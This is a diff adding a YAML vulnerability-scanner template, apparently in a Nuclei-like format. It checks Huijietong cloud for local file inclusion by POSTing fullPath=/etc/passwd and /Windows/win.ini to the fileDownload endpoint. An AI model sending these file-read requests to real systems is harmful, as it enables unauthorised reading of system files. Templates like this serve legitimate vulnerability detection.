@@ -1,0 +1,24 @@
+id: huijietong-cloud-fileread
+brief:
+    title: Huijietong - Local File Inclusion
+    by: princechaddha
+    level: high
+    about: Huijietong is vulnerable to local file inclusion.
+    label:
+        - huijietong
+        - lfi
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/fileDownload?action=downloadBackupFile'
+      body: fullPath=/etc/passwd
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/fileDownload?action=downloadBackupFile'
+      body: fullPath=/Windows/win.ini
+      signs:
+        - "on": status
+          status:
+            - 200
